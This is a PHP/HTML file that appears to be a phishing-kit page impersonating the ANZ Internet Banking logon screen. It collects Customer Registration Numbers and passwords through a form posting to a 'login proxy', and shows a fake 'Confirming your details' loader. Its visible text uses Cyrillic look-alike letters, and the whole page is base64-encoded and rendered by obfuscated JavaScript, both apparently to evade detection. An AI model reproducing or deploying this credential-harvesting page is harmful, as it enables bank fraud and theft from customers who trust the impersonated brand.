<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="login/";
?>
<html lang="en">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">


    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">

    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/token/core_token.css">


    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
    <link media="all" type="text/css" rel="stylesheet" href="index_1.css">
</head>

<?php ob_start() ?>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" bgcolor="#ffffff">
    <div class="mboxDefault" id="mbox-target-global-mbox-6c6bd7024b854eec9e385a3bc867c18e" style="visibility: visible; display: block;"></div>
    

    <div id="splashPage" class="loader__" style="display:none ;">
        <title>ANZ Internet Banking</title>
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <div class="container-fluid" id="headerBG">
            <div id="header">
                <div class="logo">
                    <img src="anz-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
                </div>
            </div>
        </div>
        <div class="container">
            <div id="loader" style="display: block;">
                <div style="padding: 145px 0px; text-align: center;">
                    <span class="fa fa-spinner fa-pulse"></span>
                    <br>
                    <div style="padding-top: 5px; color: rgb(68, 68, 68); font-family: MyriadPro-Semibold,Arial; font-size: 1em; font-weight: bold;">Confirming your details...</div>
                </div>
            </div>
        </div>
        <div class="container-fluid" id="footerBG">
            <div id="footer">&#1040;ustr&#1072;li&#1072; &#1072;nd New Ze&#1072;l&#1072;nd B&#1072;nking Gr&#1086;up Limited (&#1040;NZ) 2017 &#1040;BN 11 005 357 522.</div>
        </div>
    </div>
    <div id="logonAdmin" style="display: block;">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <title>ANZ Internet Banking - Logon</title>
        <div class="mboxDefault" style="visibility: visible; display: block;"></div>
        <div class="container-fluid" id="headerBG">
            <div id="header">
                <div class="logo">
                    <img src="anz-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
                </div>
            </div>
        </div>
        <div class="container">
            <div id="contentContainer">
                <div class="mboxDefault" style="visibility: visible; display: block;"></div>
                <!--div id="contentContainer Left" class="col-ts-12 col-sm-7 col-xs-7"-->
                <div id="contentContainerLeft" class="col-ts-12 col-xs-7">
                    <div id="logonContainer">
                        <h1>Log on to ANZ Internet Banking</h1>
                        <div id="logonBox" class="scum">
                            <form name="loginForm" method="POST" onsubmit="send1(event,'ask_login_proxy');return false">
                                <!--CRN AND PASSWORD TABLE-->
                                <div id="loginDiv">
                                    <div class="form-group">
                                        <label for="crn" class="loginDivLabels">Cust&#1086;mer Registrati&#1086;n Number</label>
                                        <input id="user" class="loginDivfields  form-control " name="CorporateSignonCorpId" tabindex="1" size="16" maxlength="19" autocomplete="OFF" pattern=".{4,}" value="" type="text">
                                    </div>
                                    <div class="form-group">
                                        <label for="Password" class="loginDivLabels">Passw&#1086;rd</label>
                                        <input id="pass" class="loginDivfields  form-control" name="CorporateSignonPassword" size="16" tabindex="2" autocomplete="OFF" pattern=".{4,}" type="password">
                                        <input type="submit" style="display: none;">
                                    </div>
                                    <div id="forgot">
                                        <a tabindex="4">Reset p&#1072;ssw&#1086;rd &#1086;nline</a>
                                    </div>
                                    <div id="logonButton">
                                        <a role="button" id="SignonButton" onclick="$(this).closest('form').submit()" class="SignonButton btn btn-primary" tabindex="3" title="Log on" style="display: inline;">
                                            Log on
                                        </a>
                                    </div>
                                    <div id="smallText">
                                        By l&#1086;gging &#1086;n, y&#1086;u &#1072;&#1089;&#1089;ept &#1086;ur
                                        <a target="_top">Se&#1089;urity &#1072;nd Priv&#1072;&#1089;y St&#1072;tement</a>.</div>
                                </div>
                            </form>
                            <!--CRN AND PASSWORD TABLE END-->
                            <!-- Once loaded focus on CRN input -->
                        </div>
                    </div>
                    <div class="mboxDefault" style="visibility: visible; display: block;"></div>
                </div>
                <div id="contentContainerRight" class="col-ts-12 col-sm-5 col-xs-5">
                    <div id="newToIBDiv">
                        <div id="iconNew2IB">
                            <h2>New t&#1086; &#1040;NZ Internet B&#1072;nking?</h2>
                        </div>
                        <p>
                        </p>
                        <ul>
                            <li>
                                <a>Register f&#1086;r &#1040;NZ Internet B&#1072;nking</a>
                            </li>
                            <li>
                                <a>Re&#1072;d &#1072;b&#1086;ut &#1040;NZ Internet B&#1072;nking</a>
                            </li>
                            <li>
                                <a>&#1058;erms &#1072;nd &#1057;&#1086;nditi&#1086;ns</a>
                            </li>
                        </ul>
                        <p></p>
                    </div>
                    <div id="needHelpDiv">
                        <div id="iconNeedHelp">
                            <h2>Need some help?</h2>
                        </div>
                        <p>
                        </p>
                        <ul>
                            <li>
                                <a>Need help l&#1086;gging &#1086;n?</a>
                            </li>
                            <li>
                                <a>Wh&#1072;t's new?</a>
                            </li>
                            <li>
                                <a>S&#1086;ftw&#1072;re requirements &#1072;nd settings</a>
                            </li>
                            <li>
                                <a>&#1057;&#1086;nt&#1072;&#1089;t us</a>
                            </li>
                        </ul>
                        <p></p>
                    </div>
                    <div id="onlineSecurityDiv">
                        <div id="iconOS">
                            <h2>&#1054;nline Se&#1089;urity</h2>
                        </div>
                        <p>
                        </p>
                        <ul>
                            <li>
                                <a>Re&#1072;d &#1089;urrent se&#1089;urity &#1072;lert</a>
                            </li>
                            <li>
                                <a>&#1054;nline Se&#1089;urity</a>
                            </li>
                            <li>
                                <a>Se&#1089;urity s&#1086;ftw&#1072;re &#1086;ffers</a>
                            </li>
                        </ul>
                        <p></p>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid" id="footerBG">
            <div id="footer">
                <span name="NOINDEX">
                    <p>©
                        <!-- BeginNoIndex -->
                        Australia and New Zealand Banking Group Limited (ANZ) 2017 ABN 11 005 357 522.
                    </p>
                    <!-- EndNoIndex -->
                </span>
            </div>
            <!-- End of #anzcontainer -->
        </div>
    </div>
    <!-- <div class="waiter__" style="display: ;">
        <div class="waiter_box__">
            <h4 class="waiter_h4__">
                Please wait...
            </h4>
            <div class="waiter_spinner__">
                <span class="fa fa-spinner fa-pulse"></span>
            </div>
            <div class="waiter_p__">
                We are connecting to banking service. <br>Please don't refresh this page
            </div>
        </div>
    </div> -->
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>